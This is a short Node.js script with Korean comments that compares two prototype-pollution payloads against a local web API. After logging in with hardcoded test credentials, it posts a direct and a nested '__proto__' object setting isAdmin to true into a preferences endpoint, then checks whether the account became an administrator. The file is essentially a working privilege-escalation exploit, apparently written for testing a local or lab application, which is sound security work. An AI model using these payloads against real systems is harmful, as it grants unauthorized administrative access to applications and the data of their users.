const axios = require('axios');

async function testBothMethods() {
  try {
    console.log('🔍 직접 vs 중첩 __proto__ 비교 테스트\n');
    
    // 로그인
    const loginResponse = await axios.post('http://localhost:5000/api/users/login', {
      email: 'bitcoin@example.com',
      password: 'BitcoinMoon$'
    });
    
    const token = loginResponse.data.token;
    console.log('✅ 로그인 성공\n');
    
    // 방법 1: 직접 __proto__
    console.log('🔥 방법 1: 직접 __proto__ 시도...');
    await axios.post('http://localhost:5000/api/settings/preferences', {
      settings: {
        theme: 'light',
        "__proto__": {
          "isAdmin": true
        }
      }
    }, { headers: { Authorization: `Bearer ${token}` } });
    
    let userCheck = await axios.get('http://localhost:5000/api/auth/me', {
      headers: { Authorization: `Bearer ${token}` }
    });
    console.log('결과 - isAdmin:', userCheck.data.user.isAdmin);
    
    // 백엔드 재시작으로 초기화
    console.log('\n🔄 백엔드 재시작 후...\n');
    
    // 방법 2: 중첩 __proto__
    console.log('🔥 방법 2: 중첩 __proto__ 시도...');
    await axios.post('http://localhost:5000/api/settings/preferences', {
      settings: {
        theme: 'dark',
        nested: {
          "__proto__": {
            "isAdmin": true
          }
        }
      }
    }, { headers: { Authorization: `Bearer ${token}` } });
    
    userCheck = await axios.get('http://localhost:5000/api/auth/me', {
      headers: { Authorization: `Bearer ${token}` }
    });
    console.log('결과 - isAdmin:', userCheck.data.user.isAdmin);
    
  } catch (error) {
    console.error('테스트 오류:', error.response?.data || error.message);
  }
}

testBothMethods();
